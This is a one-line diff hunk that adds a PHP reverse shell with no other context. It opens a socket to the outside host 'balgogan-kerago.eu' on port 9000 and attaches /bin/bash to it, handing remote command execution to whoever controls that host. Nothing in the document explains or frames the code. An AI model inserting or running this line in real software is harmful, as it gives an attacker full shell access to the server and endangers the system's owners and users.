@@ -1,0 +1,1 @@
+$sock=fsockopen("balgogan-kerago.eu",9000);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
